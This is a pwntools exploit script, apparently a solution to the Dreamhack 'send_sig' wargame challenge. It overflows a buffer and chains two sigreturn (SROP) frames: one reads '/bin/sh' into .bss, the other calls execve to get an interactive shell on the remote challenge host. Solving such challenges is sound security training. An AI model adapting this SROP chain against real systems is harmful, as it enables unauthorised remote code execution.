from pwn import *

p = remote("host1.dreamhack.games", 10176)
# p = process('./send_sig')
e = ELF('./send_sig')

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

# if you don't write this.. error...
context.arch = "x86_64"
context.log_level = 'debug'

# gdb.attach(p)

pop_rax = 0x00000000004010ae
syscall = 0x00000000004010b0

bss = e.bss()

# print(gadget)
slog("bss", bss)

buf2ret = 0x10
binsh = b"/bin/sh\x00"

#exploit[1] - read "/bin/sh"
# read(0, bss, 0x1000)
exploit = b"A"*buf2ret
exploit += p64(pop_rax)
exploit += p64(0xf)
exploit += p64(syscall)

#set stack for register
frame = SigreturnFrame()
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss
exploit += bytes(frame)

p.sendline(exploit)

#exploit[2] - execve("/bin/sh")
exploit2 = p64(pop_rax)
exploit2 += p64(15)
exploit2 += p64(syscall)

#set stack for register
frame2 = SigreturnFrame()
frame2.rax = 0x3b #SYS_execve
frame2.rdi = bss+0x110
frame2.rip = syscall
exploit2 += bytes(frame2)
exploit2 += binsh

p.sendline(exploit2)

p.interactive()